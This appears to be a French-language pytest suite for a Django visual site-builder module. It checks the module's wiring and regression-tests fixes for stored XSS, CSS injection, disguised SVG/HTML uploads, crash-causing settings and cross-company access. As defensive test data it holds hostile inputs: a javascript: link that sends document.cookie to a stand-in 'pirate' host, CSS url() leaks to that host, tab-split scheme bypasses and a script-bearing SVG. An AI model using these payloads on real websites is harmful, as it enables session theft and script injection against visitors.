"""Éditeur visuel de site : le branchement et les trois trous du moteur.

`apps.site_builder` existait sur le disque, complète — quatre modèles, dix
modules de rendu, une API AJAX, une API publique, cinq gabarits et quatre
commandes — et **absente de `LOCAL_APPS`, des URLs et du catalogue de
modules**. Elle n'avait aucune migration, et ses vues étaient toutes
derrière `require_company_module('site_builder')`, un code que
`ALL_MODULE_CODES` ne contenait pas : le module ne pouvait donc *jamais*
s'activer, quoi qu'on coche.

Les vues et l'API étaient bien écrites — tout est borné par entreprise.
Le moteur de rendu, non. Il échappait tout avec `html.escape`, ce qui
protège un contexte HTML et **rien d'autre** :

* `html.escape('javascript:alert(1)')` rend la chaîne **intacte**, et la
  valeur partait dans quatre `href`. Du JavaScript stocké, exécuté chez
  chaque visiteur du site public — et servi aussi au frontend Next.js par
  l'API publique, qui renvoie les réglages bruts.
* `'` devient `&#x27;`, que l'analyseur HTML **redécode en apostrophe**
  avant que le moteur CSS ne lise la déclaration : la valeur sortait du
  `background-image:url('…')`.
* `int()` sur un réglage libre lève `ValueError`. Le réglage étant
  *enregistré*, le 500 était durable.

Les tests ci-dessous vérifient d'abord le branchement, puis chacun de ces
trois trous aux deux endroits qui comptent : à l'enregistrement (ce que
reçoit Next.js) et au rendu (ce que voit un visiteur du HTML Django).
"""

import pytest
from django.urls import reverse

pytestmark = pytest.mark.django_db


# ── Le décor ────────────────────────────────────────────────────────────────

@pytest.fixture
def entreprise(db):
    from apps.core.models import Company

    return Company.objects.create(name='Siècle SAS', slug='siecle-sas')


@pytest.fixture
def site(entreprise):
    from apps.websites.models import Website

    return Website.objects.create(company=entreprise, name='SIÈCLE',
                                  slug='siecle', is_active=True)


@pytest.fixture
def page(entreprise, site):
    from apps.site_builder.models import BuilderPage

    return BuilderPage.objects.create(
        company=entreprise, website=site, title='Accueil', slug='accueil',
        is_homepage=True)


def _section(page, module_type='hero', **reglages):
    from apps.site_builder.models import BuilderSection
    from apps.site_builder.registry import BUILDER_MODULES

    defauts = dict(BUILDER_MODULES[module_type].get('defaults', {}))
    defauts.update(reglages)
    return BuilderSection.objects.create(page=page, module_type=module_type,
                                         position=0, settings=defauts)


# ── 1. Le branchement ───────────────────────────────────────────────────────

def test_l_app_est_enregistree():
    from django.apps import apps

    assert apps.is_installed('apps.site_builder')


def test_le_code_module_existe_dans_le_catalogue():
    """LE piège du branchement.

    Chaque vue est derrière `require_company_module('site_builder')`, et
    `company_has_module` interroge `CompanyModule`, dont les lignes sont
    créées en bouclant sur `ALL_MODULE_CODES`. Sans cette entrée, le
    module ne pouvait jamais s'activer, quoi qu'on coche dans l'interface
    — et toutes les vues refusaient en silence.
    """
    from apps.private_saas.models import (
        ALL_MODULE_CODES, MODULE_LABELS, MODULE_NAV_IDS,
    )

    assert 'site_builder' in ALL_MODULE_CODES
    assert 'site_builder' in MODULE_LABELS
    assert 'site_builder' in MODULE_NAV_IDS


def test_le_module_devient_activable(entreprise):
    """La conséquence concrète, mesurée et non supposée."""
    from apps.private_saas.models import CompanyModule
    from apps.private_saas.module_access import (
        company_has_module, seed_company_modules,
    )

    seed_company_modules(entreprise)
    assert CompanyModule.objects.filter(
        company=entreprise, module_code='site_builder').exists(), (
        "seed_company_modules boucle sur ALL_MODULE_CODES : sans l'entree, "
        'aucune ligne n est creee et le module reste inactivable')

    assert company_has_module(entreprise, 'site_builder') is False
    CompanyModule.objects.filter(
        company=entreprise, module_code='site_builder').first().enable()
    assert company_has_module(entreprise, 'site_builder') is True


@pytest.mark.parametrize('nom,chemin', [
    ('site_builder:page_list', '/editeur-visuel/'),
    ('site_builder:page_create', '/editeur-visuel/pages/new/'),
    ('public_builder:page_list', '/api/v1/public/siecle/builder/pages/'),
])
def test_les_adresses_sont_montees(nom, chemin):
    args = ['siecle'] if 'public' in nom else []
    assert reverse(nom, args=args) == chemin


def test_la_migration_existe():
    """L'app n'avait aucune migration : ses quatre tables n'existaient pas.

    Vérifié sur le disque et non par `MigrationLoader` : la suite tourne
    aussi avec `--no-migrations`, qui vide le chargeur pour TOUTES les
    applications. Le test aurait alors échoué sans qu'aucune migration ne
    manque — un faux négatif qui aurait fait chercher au mauvais endroit.
    """
    import os

    dossier = os.path.join(
        os.path.dirname(os.path.dirname(os.path.abspath(__file__))),
        'apps', 'site_builder', 'migrations')
    fichiers = [
        nom for nom in os.listdir(dossier)
        if nom.endswith('.py') and nom != '__init__.py'
    ]
    assert fichiers, 'aucune migration pour site_builder'


def test_la_migration_couvre_les_quatre_modeles():
    """Un fichier de migration vide passerait le test précédent."""
    import os
    import re

    dossier = os.path.join(
        os.path.dirname(os.path.dirname(os.path.abspath(__file__))),
        'apps', 'site_builder', 'migrations')
    contenu = ''
    for nom in sorted(os.listdir(dossier)):
        if nom.endswith('.py') and nom != '__init__.py':
            with open(os.path.join(dossier, nom), encoding='utf-8') as flux:
                contenu += flux.read()

    for modele in ('BuilderPage', 'BuilderSection', 'BuilderAsset',
                   'BuilderPublishLog'):
        assert re.search(r"name=['\"]" + modele + r"['\"]", contenu), modele


def test_les_quatre_tables_sont_utilisables(page):
    """Si la migration ne portait pas les quatre modèles, ceci lèverait."""
    from apps.site_builder.models import (
        BuilderAsset, BuilderPage, BuilderPublishLog, BuilderSection,
    )

    section = _section(page)
    BuilderPublishLog.objects.create(page=page, sections_snapshot=[])
    assert BuilderPage.objects.count() == 1
    assert BuilderSection.objects.filter(page=page).count() == 1
    assert BuilderPublishLog.objects.filter(page=page).count() == 1
    assert BuilderAsset.objects.count() == 0
    assert section.page_id == page.pk


# ── 2. Le JavaScript stocké, refusé à l'enregistrement ──────────────────────

def test_un_lien_javascript_est_refuse_a_l_enregistrement(page):
    """LE défaut principal, fermé là où il compte le plus.

    L'assainissement est à l'enregistrement et pas seulement au rendu,
    parce que `public_api._serialize_section` renvoie les réglages
    **bruts** au frontend Next.js : une protection posée uniquement dans
    `renderer.py` aurait laissé le site public exécuter le script.
    """
    from apps.site_builder.services import update_section_settings

    section = _section(page)
    update_section_settings(section, {
        'title': 'Bonjour',
        'cta_label': 'Cliquez',
        'cta_url': 'javascript:fetch("//pirate/?c="+document.cookie)',
    })
    section.refresh_from_db()
    assert section.settings['cta_url'] == ''
    assert section.settings['title'] == 'Bonjour'


def test_le_contournement_par_tabulation_est_refuse(page):
    """« java\\tscript: » s'exécute dans un navigateur.

    Les navigateurs ignorent espaces et caractères de contrôle à
    l'intérieur du schéma. Un contrôle qui compare la chaîne brute se
    contourne avec une tabulation.
    """
    from apps.site_builder.services import update_section_settings

    section = _section(page)
    for piege in ('java\tscript:alert(1)', 'java\nscript:alert(1)',
                  ' JaVaScRiPt:alert(1)', 'vbscript:msgbox(1)',
                  'data:text/html,<script>alert(1)</script>'):
        update_section_settings(section, {'cta_url': piege})
        section.refresh_from_db()
        assert section.settings['cta_url'] == '', f'accepte : {piege!r}'


def test_les_liens_legitimes_passent(page):
    """Un garde-fou qui refuse tout ne sert à rien."""
    from apps.site_builder.services import update_section_settings

    section = _section(page)
    for bon in ('/collections', '#ancre', '?page=2', './local',
                'https://siecle.fr/objets', 'http://localhost:5173/x',
                'mailto:contact@siecle.fr', 'tel:+33123456789',
                'collections/objets'):
        update_section_settings(section, {'cta_url': bon})
        section.refresh_from_db()
        assert section.settings['cta_url'] == bon, f'refuse : {bon!r}'


def test_l_api_publique_ne_sert_pas_de_javascript(client, page):
    """La preuve de bout en bout, sur la réponse que Next.js reçoit."""
    import json

    from apps.site_builder.models import BuilderPage
    from apps.site_builder.services import update_section_settings

    section = _section(page)
    update_section_settings(section, {'cta_url': 'javascript:alert(1)'})
    page.status = BuilderPage.STATUS_PUBLISHED
    page.save(update_fields=['status'])

    reponse = client.get(reverse('public_builder:page_detail',
                                 args=['siecle', 'accueil']))
    assert reponse.status_code == 200
    charge = json.dumps(json.loads(reponse.content))
    assert 'javascript:' not in charge


# ── 3. Le même défaut au rendu, pour les données déjà en base ───────────────

def test_le_rendu_ne_produit_pas_de_lien_javascript(page):
    """Défense au rendu aussi : des sections sont déjà enregistrées.

    L'assainissement à l'écriture ne nettoie pas ce qui a été stocké
    avant lui. Les deux bouts sont nécessaires.
    """
    from apps.site_builder.models import BuilderSection
    from apps.site_builder.renderer import render_section_html

    # On écrit directement en base pour contourner l'assainissement, comme
    # une section enregistrée avant la correction.
    section = BuilderSection.objects.create(
        page=page, module_type='hero', position=0,
        settings={'title': 'T', 'cta_label': 'Clic',
                  'cta_url': 'javascript:alert(1)'})

    html = render_section_html(section, page.brand_key)
    assert 'javascript:' not in html
    assert 'href="#"' in html


def test_le_rendu_ne_laisse_pas_sortir_du_css(page):
    """L'injection CSS, par l'image de fond.

    `html.escape` transforme `'` en `&#x27;` — que l'analyseur HTML
    redécode en apostrophe avant le moteur CSS. L'échappement HTML ne
    protège pas un contexte CSS.
    """
    from apps.site_builder.models import BuilderSection
    from apps.site_builder.renderer import render_section_html

    section = BuilderSection.objects.create(
        page=page, module_type='hero', position=0,
        settings={
            'title': 'T',
            'image': "x'); background:url('http://pirate/?ip=",
            'bg_color': 'red; background-image:url(http://pirate/)',
        })

    html = render_section_html(section, page.brand_key)
    assert 'pirate' not in html


def test_le_rendu_ne_laisse_pas_sortir_d_une_longueur_css(page):
    """`min_height` partait tel quel dans `min-height:…;`."""
    from apps.site_builder.models import BuilderSection
    from apps.site_builder.renderer import render_section_html

    section = BuilderSection.objects.create(
        page=page, module_type='full_image', position=0,
        settings={'title': 'T',
                  'min_height': '70vh; background:url(http://pirate/)'})

    html = render_section_html(section, page.brand_key)
    assert 'pirate' not in html
    assert 'min-height:70vh' in html, 'le defaut doit reprendre la main'


def test_une_image_legitime_s_affiche(page):
    """Le garde-fou CSS ne doit pas effacer les vraies images."""
    from apps.site_builder.models import BuilderSection
    from apps.site_builder.renderer import render_section_html

    section = BuilderSection.objects.create(
        page=page, module_type='hero', position=0,
        settings={'title': 'T', 'image': '/media/builder/images/abc.jpg',
                  'bg_color': '#0B0B0D'})

    html = render_section_html(section, page.brand_key)
    assert '/media/builder/images/abc.jpg' in html
    assert '#0B0B0D' in html


# ── 4. Le 500 durable ───────────────────────────────────────────────────────

@pytest.mark.parametrize('module_type,cle,valeur', [
    ('hero', 'overlay_opacity', 'beaucoup'),
    ('product_grid', 'count', 'huit'),
    ('gallery', 'columns', ''),
    ('spacer', 'height', None),
    ('full_image', 'overlay_opacity', {'a': 1}),
])
def test_un_reglage_numerique_illisible_ne_casse_pas_le_rendu(
        page, module_type, cle, valeur):
    """`int('huit')` levait ValueError.

    Le réglage étant enregistré, la page d'édition, l'aperçu ET le rendu
    public renvoyaient 500 **durablement** : il fallait corriger en base.
    """
    from apps.site_builder.models import BuilderSection
    from apps.site_builder.renderer import render_section_html

    section = BuilderSection.objects.create(
        page=page, module_type=module_type, position=0,
        settings={cle: valeur})

    html = render_section_html(section, page.brand_key)
    assert html, 'le rendu doit produire quelque chose'


def test_un_nombre_absurde_est_borne(page):
    """`count: 100000` demandait cent mille produits à chaque affichage."""
    from apps.site_builder.services import update_section_settings

    section = _section(page, 'product_grid')
    update_section_settings(section, {'count': 100000})
    section.refresh_from_db()
    assert section.settings['count'] == 48


def test_un_ordre_illisible_ne_casse_pas_le_glisser_deposer(page):
    """`int(sid)` levait sur une entrée non numérique."""
    from apps.site_builder.services import reorder_sections_from_ids

    premiere = _section(page)
    seconde = _section(page, 'cta')
    seconde.position = 1
    seconde.save(update_fields=['position'])

    reorder_sections_from_ids(page, [seconde.pk, 'abc', None, premiere.pk])

    seconde.refresh_from_db()
    premiere.refresh_from_db()
    assert seconde.position == 0
    assert premiere.position == 3


# ── 5. L'upload, et l'extension qui venait du client ────────────────────────

def _connecte(client, entreprise, django_user_model, superuser=True):
    from apps.accounts.models import UserProfile

    utilisateur = django_user_model.objects.create_user(
        'patron', password='x', is_superuser=superuser, is_staff=True)
    profil, _ = UserProfile.objects.get_or_create(user=utilisateur)
    profil.role = 'superadmin' if superuser else 'user'
    profil.save()
    profil.companies.add(entreprise)

    utilisateur = django_user_model.objects.get(pk=utilisateur.pk)
    client.force_login(utilisateur)
    session = client.session
    session['current_company_id'] = entreprise.pk
    session.save()
    return utilisateur


def _png(taille=(4, 4)):
    import io

    from PIL import Image

    tampon = io.BytesIO()
    Image.new('RGB', taille, (12, 12, 14)).save(tampon, format='PNG')
    tampon.seek(0)
    return tampon.getvalue()


def test_un_svg_deguise_en_png_est_refuse(client, entreprise,
                                          django_user_model):
    """Le nom du fichier ET le content_type viennent du client.

    L'ancienne version prenait l'extension dans `img.name` et croyait le
    `content_type` annoncé. « piege.svg » déclaré « image/png » passait
    les deux contrôles et atterrissait en .svg sous /media/ — un document
    XML qui peut porter un <script>, servi depuis l'origine du site.
    """
    from django.core.files.uploadedfile import SimpleUploadedFile

    _connecte(client, entreprise, django_user_model)
    svg = (b'<svg xmlns="http://www.w3.org/2000/svg">'
           b'<script>alert(1)</script></svg>')
    reponse = client.post(
        reverse('site_builder:upload_image'),
        {'image': SimpleUploadedFile('piege.svg', svg,
                                     content_type='image/png')})
    assert reponse.status_code == 400
    assert reponse.json()['success'] is False


def test_un_html_deguise_en_png_est_refuse(client, entreprise,
                                           django_user_model):
    from django.core.files.uploadedfile import SimpleUploadedFile

    _connecte(client, entreprise, django_user_model)
    reponse = client.post(
        reverse('site_builder:upload_image'),
        {'image': SimpleUploadedFile(
            'piege.png', b'<html><script>alert(1)</script></html>',
            content_type='image/png')})
    assert reponse.status_code == 400


def test_une_vraie_image_passe_et_garde_la_bonne_extension(
        client, entreprise, django_user_model):
    """L'extension vient maintenant du format lu dans les octets."""
    from django.core.files.uploadedfile import SimpleUploadedFile

    _connecte(client, entreprise, django_user_model)
    reponse = client.post(
        reverse('site_builder:upload_image'),
        {'image': SimpleUploadedFile('photo.svg', _png(),
                                     content_type='text/html')})
    assert reponse.status_code == 200
    charge = reponse.json()
    assert charge['success'] is True
    # Le nom disait .svg et le type disait text/html : les octets disent PNG.
    assert charge['url'].endswith('.png')


# ── 6. Les bornes d'entreprise, qui étaient déjà bonnes ─────────────────────

def test_une_autre_entreprise_n_ouvre_pas_la_page(client, page,
                                                  django_user_model):
    """Vérifié, pas supposé : ces vues étaient déjà bornées.

    Contrairement aux dossiers privés RH, l'auteur de ce module avait
    borné chaque requête. Ce test fige la propriété.
    """
    from apps.core.models import Company

    autre = Company.objects.create(name='Toiture Martin', slug='martin')
    _connecte(client, autre, django_user_model, superuser=False)

    for nom in ('site_builder:page_edit', 'site_builder:builder',
                'site_builder:preview'):
        reponse = client.get(reverse(nom, args=[page.pk]))
        assert reponse.status_code in (302, 404), nom


def test_une_section_d_une_autre_entreprise_n_est_pas_modifiable(
        client, page, django_user_model):
    """L'endpoint prend un `section_id` et non un `page_id` — la forme
    exacte du défaut corrigé dans les dossiers privés RH. Ici, il était
    déjà borné par `page__company`."""
    import json

    from apps.core.models import Company

    section = _section(page)
    autre = Company.objects.create(name='Toiture Martin', slug='martin')
    _connecte(client, autre, django_user_model, superuser=False)

    reponse = client.post(
        reverse('site_builder:update_section', args=[section.pk]),
        data=json.dumps({'settings': {'title': 'Pirate'}}),
        content_type='application/json')
    assert reponse.status_code in (302, 404)

    section.refresh_from_db()
    assert section.settings.get('title') != 'Pirate'


# ── 7. L'API publique ne sert que le publié ─────────────────────────────────

def test_une_page_non_publiee_reste_invisible(client, page):
    """La règle annoncée en tête de `public_api` : jamais de brouillon."""
    _section(page)
    reponse = client.get(reverse('public_builder:page_detail',
                                 args=['siecle', 'accueil']))
    assert reponse.status_code == 404


def test_une_page_publiee_est_servie(client, page):
    from apps.site_builder.models import BuilderPage

    _section(page)
    page.status = BuilderPage.STATUS_PUBLISHED
    page.save(update_fields=['status'])

    reponse = client.get(reverse('public_builder:page_detail',
                                 args=['siecle', 'accueil']))
    assert reponse.status_code == 200
    charge = reponse.json()
    assert charge['page']['slug'] == 'accueil'
    assert len(charge['page']['sections']) == 1


def test_un_site_inactif_ne_sert_rien(client, page, site):
    from apps.site_builder.models import BuilderPage

    page.status = BuilderPage.STATUS_PUBLISHED
    page.save(update_fields=['status'])
    site.is_active = False
    site.save(update_fields=['is_active'])

    reponse = client.get(reverse('public_builder:page_detail',
                                 args=['siecle', 'accueil']))
    assert reponse.status_code == 404
